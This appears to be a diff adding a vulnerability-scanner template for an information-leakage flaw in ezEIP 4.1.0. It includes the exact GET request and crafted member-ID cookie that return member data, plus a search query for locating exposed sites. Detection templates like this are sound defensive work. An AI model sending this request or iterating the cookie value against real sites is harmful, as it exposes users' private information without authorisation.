@@ -1,0 +1,30 @@
+id: ezeip-info-leakage
+
+info:
+  name: ezEIP 4.1.0 信息泄露
+  author: daffainfo
+  severity: high
+  description: |
+    ezEIP 4.1.0 has an information leakage vulnerability, sensitive information can be obtained by traversing the parameter values in Cookie.
+    fofa-query: "ezEIP"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/ezEIP%204.1.0%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+
+http:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/label/member/getinfo.aspx"
+    headers:
+      Cookie: WHIR_USERINFOR=whir_mem_member_pid=1;
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"Key":'
+          - '"Value":'
+        part: body
+        condition: and
